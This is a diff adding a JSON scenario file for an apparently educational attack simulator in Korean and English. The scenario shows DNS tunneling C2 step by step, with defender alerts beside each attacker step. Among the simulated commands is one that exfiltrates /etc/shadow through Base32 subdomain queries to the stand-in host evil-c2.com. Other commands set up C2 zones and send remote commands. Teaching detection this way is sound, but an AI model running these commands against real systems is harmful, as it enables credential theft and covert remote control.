@@ -1,0 +1,179 @@
+{
+  "id": "T1583.002",
+  "title": "악성 DNS 서버 구축 시뮬레이션",
+  "titleEn": "Malicious DNS Server Setup Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "🔧 DNS 서버 구축", "labelEn": "🔧 DNS Server Setup", "steps": [0, 1] },
+    { "label": "⚡ 터널링 설정", "labelEn": "⚡ Tunneling Setup", "steps": [2, 3] },
+    { "label": "✅ C2 통신 확립", "labelEn": "✅ C2 Communication", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "vps", "label": "VPS Server", "x": 200, "y": 30 },
+    { "id": "dns", "label": "Malicious DNS", "x": 200, "y": 90 },
+    { "id": "fw", "label": "Firewall", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim Network", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "vps", "minStep": 0 },
+    { "from": "vps", "to": "dns", "minStep": 1 },
+    { "from": "dns", "to": "fw", "minStep": 2 },
+    { "from": "fw", "to": "victim", "minStep": 3 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "dns_config/", "icon": "📁" },
+    { "name": "tunnel_data.log", "icon": "📄", "alert": true },
+    { "name": "c2_commands.txt", "icon": "📝" }
+  ],
+  "steps": [
+    {
+      "cmd": "apt install bind9 && cat /etc/bind/named.conf.local",
+      "out": "Reading package lists... Done\nSetting up bind9 (9.18.18) ...\n\n// /etc/bind/named.conf.local\nzone \"evil-c2.com\" {\n    type master;\n    file \"/etc/bind/zones/db.evil-c2.com\";\n    allow-transfer { none; };\n};\n\nzone \"data-exfil.net\" {\n    type master;\n    file \"/etc/bind/zones/db.data-exfil.net\";\n    allow-transfer { none; };\n};",
+      "def": "[VPS Provider] New DNS server instance deployed",
+      "defAction": "Source: VPS deployment\nTarget: 198.51.100.50\nAction: Standard service activation logged",
+      "desc": "VPS에 BIND9 DNS 서버를 설치하고 악성 도메인 존을 설정합니다.",
+      "descEn": "Installing BIND9 DNS server on VPS and configuring malicious domain zones.",
+      "stepTitle": "DNS 서버 설치 및 존 설정",
+      "stepTitleEn": "DNS Server Installation and Zone Configuration",
+      "feynman": "DNS 서버를 설치하는 것은 전화번호부 관리 센터를 만드는 것과 같습니다. 공격자는 자신만의 전화번호부(evil-c2.com)를 만들어, 피해자의 컴퓨터가 이 번호부에 문의하면 악성 명령을 전달할 수 있습니다.",
+      "feynmanEn": "Setting up a DNS server is like creating your own phone book management center. The attacker creates their own directory (evil-c2.com) and delivers malicious commands when victims' computers query it.",
+      "expert": "BIND9으로 authoritative DNS 서버를 구성합니다. allow-transfer {none}으로 존 전송을 차단하고, 악성 도메인의 NS 레코드를 이 서버로 설정합니다.",
+      "expertEn": "Configuring BIND9 as an authoritative DNS server. Zone transfers are blocked with allow-transfer {none}, and NS records for malicious domains point to this server.",
+      "defTooltip": "🖥️ VPS: 새 DNS 서버 인스턴스 배포",
+      "defTooltipEn": "🖥️ VPS: New DNS server instance deployed",
+      "hackerLog": {
+        "title": "dns_setup.log",
+        "lines": [
+          { "log": "zone \"evil-c2.com\" { type master; }", "desc": "💡 C2 통신용 도메인 존 설정 완료" },
+          { "log": "zone \"data-exfil.net\" { type master; }", "desc": "💡 데이터 유출용 별도 도메인 준비" },
+          { "log": "allow-transfer { none; }", "desc": "💡 존 전송 차단 - 다른 DNS에서 데이터 복제 방지" }
+        ]
+      },
+      "terms": [
+        { "name": "BIND9", "desc": "가장 널리 사용되는 오픈소스 DNS 서버 소프트웨어. 정상적으로는 도메인 이름 해석에 사용되지만, 공격자도 악성 DNS 서버 구축에 활용합니다" },
+        { "name": "Zone (존)", "desc": "DNS에서 하나의 도메인에 대한 모든 레코드를 관리하는 단위. 존 파일에 도메인의 IP 매핑 등이 정의됩니다" }
+      ]
+    },
+    {
+      "cmd": "cat /etc/bind/zones/db.evil-c2.com",
+      "out": "$TTL    60\n@       IN      SOA     ns1.evil-c2.com. admin.evil-c2.com. (\n                     2024031501 ; Serial\n                     60         ; Refresh\n                     60         ; Retry\n                     604800     ; Expire\n                     60 )       ; Minimum TTL\n\n@       IN      NS      ns1.evil-c2.com.\nns1     IN      A       198.51.100.50\n\n; C2 beacon endpoint\nbeacon  IN      A       198.51.100.50\n\n; Dynamic TXT records for commands (handled by dnspython)\n; cmd     IN      TXT     \"encoded_command_here\"",
+      "def": "[DNS Monitor] Low TTL (60s) zone file detected - potential C2 infrastructure",
+      "defAction": "Source: DNS analysis\nTarget: evil-c2.com\nAction: Domain added to monitoring watchlist",
+      "desc": "C2 통신을 위한 DNS 존 파일을 구성합니다. 낮은 TTL로 빠른 IP 변경이 가능합니다.",
+      "descEn": "Configuring DNS zone file for C2 communication with low TTL enabling rapid IP changes.",
+      "stepTitle": "C2용 DNS 레코드 설정",
+      "stepTitleEn": "C2 DNS Record Configuration",
+      "feynman": "TTL(Time To Live)을 60초로 설정하면 매분마다 DNS 정보가 갱신됩니다. 마치 전화번호를 1분마다 바꾸는 것처럼, 방어자가 차단하기 전에 계속 새로운 IP로 전환할 수 있습니다. 이것을 'Fast Flux'라고 합니다.",
+      "feynmanEn": "Setting TTL to 60 seconds means DNS info refreshes every minute. Like changing your phone number every minute, attackers can switch to new IPs before defenders can block them. This is called 'Fast Flux.'",
+      "expert": "TTL 60초는 Fast Flux 인프라의 전형적 지표입니다. TXT 레코드를 동적으로 생성하여 인코딩된 C2 명령을 전달하며, dnspython 라이브러리로 프로그래밍 방식의 응답을 생성합니다.",
+      "expertEn": "60-second TTL is a classic Fast Flux indicator. TXT records are dynamically generated to deliver encoded C2 commands, with dnspython library creating programmatic responses.",
+      "defTooltip": "🔍 DNS 모니터: 낮은 TTL(60초) 존 파일 감지 - C2 인프라 의심",
+      "defTooltipEn": "🔍 DNS Monitor: Low TTL (60s) zone file detected - potential C2",
+      "hackerLog": {
+        "title": "zone_config.log",
+        "lines": [
+          { "log": "TTL 60 ; Minimum TTL", "desc": "💡 60초 TTL = 매분 IP 변경 가능 (Fast Flux)" },
+          { "log": "beacon IN A 198.51.100.50", "desc": "💡 악성코드 비콘이 접속할 C2 엔드포인트" },
+          { "log": "cmd IN TXT \"encoded_command\"", "desc": "💡 TXT 레코드로 암호화된 명령 전달" }
+        ]
+      },
+      "terms": [
+        { "name": "TTL (Time To Live)", "desc": "DNS 레코드가 캐시에 유지되는 시간(초). 낮은 TTL은 빈번한 IP 변경을 가능하게 하여 차단을 어렵게 합니다" },
+        { "name": "Fast Flux", "desc": "DNS의 짧은 TTL을 이용하여 악성 서버의 IP를 빠르게 변경하는 회피 기법" }
+      ]
+    },
+    {
+      "cmd": "python3 dns_tunnel_server.py --domain evil-c2.com --listen 0.0.0.0:53",
+      "out": "[*] DNS Tunnel Server started on evil-c2.com\n[*] Listening on 0.0.0.0:53 (UDP/TCP)\n[*] Encoding: Base32 subdomain encoding\n[*] Max chunk size: 63 bytes per label\n\n[+] Waiting for incoming DNS tunnel connections...\n[+] Connection from 10.0.10.45 (victim-pc.{companyName}.local)\n[+] Session established: SID-4829\n[+] Inbound data: system_info.json (2.4 KB)\n[+] Sending command via TXT response...",
+      "def": "[DNS Firewall] Anomalous DNS query pattern detected - possible DNS tunneling",
+      "defAction": "Source: 10.0.10.45\nTarget: evil-c2.com (198.51.100.50)\nAction: Suspicious DNS traffic flagged, investigation initiated",
+      "desc": "DNS 터널링 서버를 시작하여 방화벽을 우회하는 은밀한 통신 채널을 구축합니다.",
+      "descEn": "Starting DNS tunnel server to establish covert communication channel that bypasses firewalls.",
+      "stepTitle": "DNS 터널링 서버 가동",
+      "stepTitleEn": "DNS Tunnel Server Activation",
+      "feynman": "DNS 터널은 편지 봉투 안에 비밀 메시지를 숨기는 것과 같습니다. 정상적인 DNS 쿼리처럼 보이지만, 실제로는 서브도메인 이름에 데이터가 인코딩되어 있습니다. 방화벽은 이것을 평범한 DNS 쿼리로 인식하고 통과시킵니다.",
+      "feynmanEn": "A DNS tunnel is like hiding secret messages inside envelope labels. It looks like normal DNS queries, but data is actually encoded in subdomain names. Firewalls see it as ordinary DNS traffic and let it through.",
+      "expert": "Base32 인코딩으로 서브도메인 레이블(최대 63바이트)에 데이터를 삽입합니다. 예: dGhlc2VjcmV0.evil-c2.com 형태로 쿼리하면, DNS 서버가 데이터를 디코딩하고 TXT 응답에 명령을 인코딩하여 전달합니다.",
+      "expertEn": "Data is inserted into subdomain labels (max 63 bytes) using Base32 encoding. Queries like dGhlc2VjcmV0.evil-c2.com are decoded by the DNS server, which encodes commands in TXT responses.",
+      "defTooltip": "🚨 DNS 방화벽: 비정상 DNS 쿼리 패턴 감지 - DNS 터널링 의심",
+      "defTooltipEn": "🚨 DNS Firewall: Anomalous DNS query pattern - possible tunneling",
+      "hackerLog": {
+        "title": "tunnel_session.log",
+        "lines": [
+          { "log": "Connection from 10.0.10.45", "desc": "💡 피해자 PC에서 DNS 터널 연결 수립!" },
+          { "log": "Inbound data: system_info.json (2.4 KB)", "desc": "💡 시스템 정보가 DNS 쿼리를 통해 유출되고 있습니다" },
+          { "log": "Sending command via TXT response", "desc": "💡 DNS 응답에 숨겨진 명령을 전달 중" }
+        ]
+      },
+      "terms": [
+        { "name": "DNS Tunneling", "desc": "DNS 프로토콜을 이용하여 방화벽을 우회하고 데이터를 전송하는 기법. DNS 쿼리의 서브도메인과 TXT 응답에 데이터를 인코딩합니다" },
+        { "name": "Base32 Encoding", "desc": "이진 데이터를 A-Z, 2-7 문자로 변환하는 인코딩 방식. DNS 레이블에 사용할 수 있는 문자만 사용합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 dns_exfil.py --session SID-4829 --file /etc/shadow --chunk-size 60",
+      "out": "[*] Exfiltrating /etc/shadow via DNS tunnel...\n[*] File size: 1,847 bytes\n[*] Chunks: 31 DNS queries required\n[*] Encoding: Base32 in subdomain labels\n\nSending chunk 1/31: R09UUk9PVDN4dC..evil-c2.com [OK]\nSending chunk 2/31: JtYWluOiQ2JGN3..evil-c2.com [OK]\n...\nSending chunk 31/31: bGFzdF9jaHVuaw..evil-c2.com [OK]\n\n[+] Exfiltration complete: 1,847 bytes in 31 queries\n[+] Average throughput: 59 bytes/query\n[+] Duration: 4.2 seconds",
+      "def": "[DNS Analytics] High entropy subdomain queries to evil-c2.com (31 queries in 4s)",
+      "defAction": "Source: 10.0.10.45\nTarget: evil-c2.com\nAction: DNS exfiltration alert generated, IR team notified",
+      "desc": "민감한 파일을 DNS 쿼리에 인코딩하여 외부로 유출합니다.",
+      "descEn": "Exfiltrating sensitive files by encoding them in DNS queries.",
+      "stepTitle": "DNS 터널을 통한 데이터 유출",
+      "stepTitleEn": "Data Exfiltration via DNS Tunnel",
+      "feynman": "1,847바이트의 비밀번호 파일을 31개의 DNS 질문으로 나누어 보내는 것입니다. 각 질문의 서브도메인에 60바이트씩 데이터를 숨깁니다. 방화벽은 31번의 DNS 조회를 '정상적인 웹사이트 접속 시도'로 판단합니다.",
+      "feynmanEn": "The 1,847-byte password file is split into 31 DNS queries, with 60 bytes hidden in each subdomain. The firewall sees 31 DNS lookups as 'normal website access attempts.'",
+      "expert": "DNS 유출의 이론적 대역폭은 쿼리당 약 60바이트입니다(63바이트 레이블 제한). 31개 쿼리로 1.8KB를 4.2초에 전송하였으며, 실제 공격에서는 쿼리 간격을 늘려 탐지를 회피합니다.",
+      "expertEn": "Theoretical DNS exfiltration bandwidth is ~60 bytes per query (63-byte label limit). 31 queries transferred 1.8KB in 4.2 seconds. Real attacks increase query intervals to evade detection.",
+      "defTooltip": "📊 DNS 분석: evil-c2.com에 대한 고엔트로피 서브도메인 쿼리 (4초에 31개)",
+      "defTooltipEn": "📊 DNS Analytics: High entropy subdomain queries to evil-c2.com",
+      "hackerLog": {
+        "title": "exfil_log.txt",
+        "lines": [
+          { "log": "Exfiltrating /etc/shadow", "desc": "💡 시스템 비밀번호 해시 파일이 유출되고 있습니다!" },
+          { "log": "31 DNS queries required", "desc": "💡 31번의 '정상 DNS 쿼리'로 위장하여 데이터 전송" },
+          { "log": "Duration: 4.2 seconds", "desc": "💡 4초 만에 파일 전체 유출 완료" }
+        ]
+      },
+      "terms": [
+        { "name": "Data Exfiltration", "desc": "조직의 민감한 데이터를 외부로 무단 전송하는 행위. DNS, HTTP, ICMP 등 다양한 프로토콜을 통해 수행될 수 있습니다" },
+        { "name": "/etc/shadow", "desc": "Linux 시스템의 사용자 비밀번호 해시가 저장된 파일. 이 파일이 유출되면 오프라인 크래킹으로 비밀번호를 복원할 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "python3 dns_c2_controller.py --session SID-4829 --cmd \"whoami && ipconfig /all\"",
+      "out": "[*] Encoding command in TXT record response...\n[*] Command: whoami && ipconfig /all\n[*] Waiting for beacon check-in...\n\n[+] Beacon check-in from 10.0.10.45 (interval: 30s)\n[+] Command delivered via TXT record\n[+] Response received (3 DNS queries):\n\n{companyName}\\admin-user\n\nEthernet adapter Corporate LAN:\n   IPv4 Address: 10.0.10.45\n   Subnet Mask: 255.255.255.0\n   Default Gateway: 10.0.10.1\n   DNS Servers: 10.0.10.2, 10.0.10.3\n   Domain: {companyName}.local\n\n[+] Full C2 channel operational via DNS",
+      "def": "[SIEM] Complete DNS-based C2 channel identified - CRITICAL",
+      "defAction": "Source: DNS analytics + endpoint correlation\nTarget: 10.0.10.45 ↔ evil-c2.com\nAction: Incident created, endpoint isolation recommended",
+      "desc": "DNS를 통한 완전한 양방향 C2 채널을 확립하여 피해자 시스템을 원격 제어합니다.",
+      "descEn": "Establishing full bidirectional C2 channel via DNS for remote control of the victim system.",
+      "stepTitle": "DNS C2 채널을 통한 원격 제어",
+      "stepTitleEn": "Remote Control via DNS C2 Channel",
+      "feynman": "이제 공격자는 DNS를 전화처럼 사용합니다. 피해자의 컴퓨터가 30초마다 DNS 질문을 하면, 공격자의 DNS 서버가 답변에 명령을 숨겨 보냅니다. 'whoami'라는 명령을 보내자 피해자 PC의 사용자명과 네트워크 정보가 돌아왔습니다. 방화벽은 이 모든 것을 '정상 DNS 통신'으로 봅니다.",
+      "feynmanEn": "The attacker now uses DNS like a telephone. The victim's computer asks a DNS question every 30 seconds, and the attacker's DNS server hides commands in the answers. Sending 'whoami' returned the victim's username and network info. The firewall sees all of this as 'normal DNS.'",
+      "expert": "30초 비콘 간격의 DNS C2 채널이 확립되었습니다. 명령은 TXT 응답에, 결과는 서브도메인 인코딩으로 전달됩니다. 내부 DNS 서버(10.0.10.2/3)를 통해 재귀적으로 외부 DNS에 도달하므로 직접 외부 DNS 차단으로는 방어되지 않습니다.",
+      "expertEn": "DNS C2 channel established with 30-second beacon interval. Commands in TXT responses, results in subdomain encoding. Reaches external DNS recursively through internal DNS servers (10.0.10.2/3), so direct external DNS blocking is ineffective.",
+      "defTooltip": "🚨 SIEM: DNS 기반 완전한 C2 채널 식별 - 심각도 CRITICAL",
+      "defTooltipEn": "🚨 SIEM: Complete DNS-based C2 channel identified - CRITICAL",
+      "hackerLog": {
+        "title": "c2_session.log",
+        "lines": [
+          { "log": "{companyName}\\admin-user", "desc": "💡 관리자 계정으로 로그인된 PC 장악!" },
+          { "log": "Domain: {companyName}.local", "desc": "💡 Active Directory 도메인 이름 확인 - 횡적 이동 준비" },
+          { "log": "Full C2 channel operational via DNS", "desc": "💡 방화벽을 우회하는 완전한 원격 제어 채널 확보" }
+        ]
+      },
+      "terms": [
+        { "name": "C2 (Command & Control)", "desc": "공격자가 침해된 시스템에 명령을 내리고 결과를 수신하는 통신 채널. DNS, HTTP, HTTPS 등 다양한 프로토콜 사용" },
+        { "name": "Beacon", "desc": "악성코드가 C2 서버에 주기적으로 접속하여 새 명령이 있는지 확인하는 행위. 비콘 간격이 짧을수록 실시간 제어가 가능합니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "bind9 (PID: 5001)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "python3 dns_tunnel_server.py (PID: 5134)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "python3 dns_exfil.py (PID: 5201)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "python3 dns_c2_controller.py (PID: 5289)", "depth": 1, "alert": true, "minStep": 4 }
+  ]
+}
